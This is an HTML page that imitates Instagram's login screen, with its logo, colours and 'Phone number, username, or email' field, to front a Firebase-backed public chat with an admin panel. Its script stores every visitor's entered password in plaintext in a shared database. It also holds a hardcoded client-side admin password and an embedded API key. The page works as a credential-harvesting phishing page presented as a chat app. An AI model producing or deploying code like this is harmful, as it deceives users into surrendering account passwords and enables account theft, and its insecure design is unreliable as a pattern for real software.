<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Clone Chat</title>
<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background: linear-gradient(135deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
}

/* Login Container */
.login-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background-color: white;
  border-radius: 10px;
  padding: 40px 50px;
  width: 90%;
  max-width: 350px;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
}

.login-container img {
  width: 120px;
  margin-bottom: 20px;
}

.input-field {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border: 1px solid #dbdbdb;
  border-radius: 6px;
  background: #fafafa;
  font-size: 14px;
  box-sizing: border-box;
}

.input-field:focus {
  outline: none;
  border-color: #3897f0;
}

.login-button {
  width: 100%;
  padding: 12px;
  margin: 15px 0;
  border: none;
  border-radius: 6px;
  background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
  color: white;
  font-weight: bold;
  cursor: pointer;
  font-size: 14px;
}

.login-button:hover { opacity: 0.9; }

.or-divider {
  display: flex;
  align-items: center;
  width: 100%;
  text-align: center;
  margin: 10px 0;
  font-size: 12px;
  color: #999;
}

.or-divider::before,
.or-divider::after {
  content: "";
  flex: 1;
  border-bottom: 1px solid #dbdbdb;
  margin: 0 10px;
}

/* Chat */
#chatBox {
  display: none;
  flex-direction: column;
  align-items: center;
  width: 100%;
  max-width: 400px;
  background-color: white;
  border-radius: 10px;
  padding: 20px;
  box-sizing: border-box;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
}

#messages {
  width: 100%;
  max-height: 400px;
  overflow-y: auto;
  padding: 10px;
  display: flex;
  flex-direction: column;
}

.message {
  padding: 8px 12px;
  margin: 6px 0;
  border-radius: 20px;
  max-width: 70%;
  word-wrap: break-word;
  font-size: 14px;
}

.message.self { align-self: flex-end; background: #3897f0; color: white; }
.message.other { align-self: flex-start; background: #efefef; color: black; }

#messageInput {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: 1px solid #dbdbdb;
  border-radius: 20px;
  box-sizing: border-box;
  font-size: 14px;
}

#sendButton {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: none;
  border-radius: 20px;
  background-color: #3897f0;
  color: white;
  font-weight: bold;
  cursor: pointer;
}

#sendButton:hover { opacity: 0.9; }

/* Admin Panel */
#adminPanel {
  display: none;
  width: 90%;
  max-width: 500px;
  background-color: white;
  border-radius: 10px;
  padding: 20px;
  box-sizing: border-box;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  flex-direction: column;
}

#liveUsers div { display: flex; justify-content: space-between; margin-bottom: 5px; }
#stopChatBtn { padding:8px 12px; margin-bottom:10px; border:none; border-radius:5px; background-color:#3897f0; color:white; cursor:pointer; }
#stopChatBtn:hover { opacity:0.9; }

</style>
</head>
<body>

<!-- Login -->
<div class="login-container" id="instagramClone">
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
  <input class="input-field" type="text" id="usernameClone" placeholder="Phone number, username, or email">
  <input class="input-field" type="password" id="passwordClone" placeholder="Password">
  <button class="login-button" onclick="login()">Log In</button>
  <div class="or-divider">OR</div>
</div>

<!-- Public Chat -->
<div id="chatBox">
  <h2 style="text-align:center; margin-bottom:10px;">Public Chat</h2>
  <div id="messages"></div>
  <input id="messageInput" type="text" placeholder="Type a message...">
  <button id="sendButton" onclick="sendMessage()">Send</button>
</div>

<!-- Admin Panel -->
<div id="adminPanel">
  <h2>Admin Panel - Live Users</h2>
  <button id="stopChatBtn" onclick="toggleChat()">Stop Chat</button>
  <div id="liveUsers"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyD0rDXHKp9BIVp3x3OOlqhZnWSf8XfF_NY",
  authDomain: "coins-72039.firebaseapp.com",
  databaseURL: "https://coins-72039-default-rtdb.firebaseio.com",
  projectId: "coins-72039",
  storageBucket: "coins-72039.firebasestorage.app",
  messagingSenderId: "878100244630",
  appId: "1:878100244630:web:0c307e25d7993f5c4e3ab7",
  measurementId: "G-JGTWXLJQWP"
};
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let usernameGlobal = "";
let chatEnabled = true;

function login() {
  const username = document.getElementById('usernameClone').value.trim();
  const password = document.getElementById('passwordClone').value;

  if(username === "admin" && password === "2511") {
    document.getElementById('instagramClone').style.display = 'none';
    document.getElementById('adminPanel').style.display = 'flex';
    loadLiveUsers();
    database.ref('chatStatus').set({enabled: true}); // default enabled
  } else if(username) {
    usernameGlobal = username;
    document.getElementById('instagramClone').style.display = 'none';
    document.getElementById('chatBox').style.display = 'flex';

    database.ref('users/' + username).set({
      username,
      password,
      lastActive: Date.now(),
      online: true
    });

    setInterval(() => {
      database.ref('users/' + username).update({ lastActive: Date.now(), online: true });
    }, 5000);

    window.addEventListener("beforeunload", () => {
      database.ref('users/' + username).update({ online: false });
    });

    // Detect account deletion
    database.ref('users/' + username).on('value', snapshot => {
      if(!snapshot.exists()) {
        alert("Your account has been deleted by admin.");
        window.location.reload();
      }
    });

    loadMessages();
  } else {
    alert("Please enter a username");
  }
}

// Chat functions
function sendMessage() {
  if(!chatEnabled) return alert("Chat has been stopped by admin.");
  const msg = document.getElementById('messageInput').value.trim();
  if(msg) {
    const newMsgRef = database.ref('publicChat').push();
    newMsgRef.set({
      username: usernameGlobal,
      message: msg,
      timestamp: Date.now()
    });
    document.getElementById('messageInput').value = "";
  }
}

function loadMessages() {
  const messagesDiv = document.getElementById('messages');
  database.ref('publicChat').on('child_added', snapshot => {
    const data = snapshot.val();
    const p = document.createElement('div');
    p.className = 'message ' + (data.username === usernameGlobal ? 'self' : 'other');
    p.textContent = `${data.username}: ${data.message}`;
    messagesDiv.appendChild(p);
    messagesDiv.scrollTop = messagesDiv.scrollHeight;
  });
}

// Admin functions
function loadLiveUsers() {
  const liveUsersDiv = document.getElementById('liveUsers');
  const usersRef = database.ref('users');
  usersRef.on('value', snapshot => {
    liveUsersDiv.innerHTML = '';
    snapshot.forEach(userSnap => {
      const user = userSnap.val();
      const username = user.username;
      const lastActiveDate = new Date(user.lastActive);
      const isOnline = user.online ? 'ðŸŸ¢ Online' : 'âšª Offline';

      const userDiv = document.createElement('div');
      userDiv.textContent = `${username} - ${isOnline} - Last Active: ${lastActiveDate.toLocaleTimeString()}`;

      const deleteBtn = document.createElement('button');
      deleteBtn.textContent = 'Delete';
      deleteBtn.style.marginLeft = '10px';
      deleteBtn.onclick = () => {
        database.ref('users/' + username).remove();
        database.ref('publicChat').orderByChild('username').equalTo(username).once('value', snap => {
          snap.forEach(childSnap => childSnap.ref.remove());
        });
      };
      userDiv.appendChild(deleteBtn);
      liveUsersDiv.appendChild(userDiv);
    });
  });
}

// Stop/Start chat
function toggleChat() {
  chatEnabled = !chatEnabled;
  database.ref('chatStatus').set({ enabled: chatEnabled });
  document.getElementById('stopChatBtn').textContent = chatEnabled ? "Stop Chat" : "Start Chat";
}

// Listen to chat status
database.ref('chatStatus').on('value', snapshot => {
  const status = snapshot.val();
  chatEnabled = status ? status.enabled : true;
  const input = document.getElementById('messageInput');
  const sendBtn = document.getElementById('sendButton');
  if(input) input.disabled = !chatEnabled;
  if(sendBtn) sendBtn.disabled = !chatEnabled;
});

</script>
</body>
</html>
